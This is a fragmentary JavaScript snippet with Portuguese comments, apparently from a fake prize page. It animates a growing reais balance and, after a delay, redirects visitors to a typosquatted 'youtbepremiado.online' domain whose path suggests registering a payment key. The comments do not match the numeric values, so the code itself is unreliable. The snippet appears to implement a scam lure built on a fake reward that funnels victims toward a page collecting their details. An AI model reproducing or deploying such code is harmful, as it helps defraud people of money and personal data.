...
let valor = 8550; // Valor inicial em centavos (R$ 33,00)
const valorFinal = 11830; // Valor final em centavos (R$ 85,50)
...
const intervalo = setInterval(() => {
    ...
    cardRedText.textContent = `R$ ${(valor / 100).toFixed(2)}`;
        ...
        setTimeout(function() {
            ...
            window.location.href = "https://youtbepremiado.online/cadastrarchave";
        }, 4000);
    });
});
